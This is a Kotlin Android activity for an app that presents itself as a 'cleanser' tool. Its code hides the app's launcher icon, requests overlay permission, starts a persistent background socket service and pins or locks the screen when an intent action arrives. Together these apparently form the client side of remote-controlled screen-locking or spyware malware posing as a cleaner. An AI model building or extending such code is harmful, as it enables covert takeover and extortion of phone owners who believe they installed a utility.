package com.cleanser.app

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CH = "com.cleanser.app/native"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        handleAction(intent?.getStringExtra("action"))
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleAction(intent.getStringExtra("action"))
    }

    private fun handleAction(action: String?) {
        when (action) {
            "start_screen_pinning" ->
                Handler(Looper.getMainLooper()).postDelayed({ startScreenPinning() }, 250)
            "stop_screen_pinning" ->
                Handler(Looper.getMainLooper()).postDelayed({ stopLockTask(); moveTaskToBack(true) }, 100)
        }
    }

    override fun configureFlutterEngine(fe: FlutterEngine) {
        super.configureFlutterEngine(fe)
        MethodChannel(fe.dartExecutor.binaryMessenger, CH).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkOverlay" -> result.success(
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
                )
                "requestOverlay" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = android.net.Uri.parse("package:$packageName")
                        })
                    }
                    result.success(null)
                }
                "startService" -> {
                    val i = Intent(this, SocketService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
                    result.success(true)
                }
                "isConnected" -> {
                    val prefs = getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                    result.success(prefs.getBoolean("socket_connected", false))
                }
                "hideApp" -> {
                    packageManager.setComponentEnabledSetting(
                        ComponentName(this, "com.cleanser.app.MainActivityAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                    moveTaskToBack(true)
                    result.success(null)
                }
                else -> result.notImplemented()
            }
        }
    }

    fun startScreenPinning() {
        try { startLockTask() } catch (_: Exception) {}
    }
}
